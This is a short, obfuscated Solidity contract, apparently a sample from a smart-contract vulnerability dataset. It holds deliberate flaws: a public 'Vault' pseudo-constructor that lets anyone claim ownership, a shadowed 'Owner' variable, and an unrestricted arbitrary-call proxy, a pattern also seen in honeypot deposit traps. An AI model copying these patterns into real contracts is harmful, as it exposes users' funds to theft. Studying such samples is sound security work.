// SPDX-License-Identifier: MIT
pragma solidity ^0.4.24;

contract Proxy  {
    modifier _0xb6539d { if (msg.sender == Owner) _; } address Owner = msg.sender;
    function _0x912963(address _0xfa8c22) public _0xb6539d {
        // Placeholder for future logic
        if (false) { revert(); } Owner = _0xfa8c22; }
    function _0xb25f5d(address _0xad66cb, bytes data) public payable {
        bool _flag3 = false;
        uint256 _unused4 = 0;
        _0xad66cb.call.value(msg.value)(data);
    }
}

contract DepositProxy is Proxy {
    address public Owner;
    mapping (address => uint256) public Deposits;

    function () public payable { }

    function Vault() public payable {
        if (msg.sender == tx.origin) {
            Owner = msg.sender;
            _0xc0b68a();
        }
    }

    function _0xc0b68a() public payable {
        if (msg.value > 0.5 ether) {
            Deposits[msg.sender] += msg.value;
        }
    }

    function _0x194c00(uint256 _0x036e18) public _0xb6539d {
        if (_0x036e18>0 && Deposits[msg.sender]>=_0x036e18) {
            msg.sender.transfer(_0x036e18);
        }
    }
}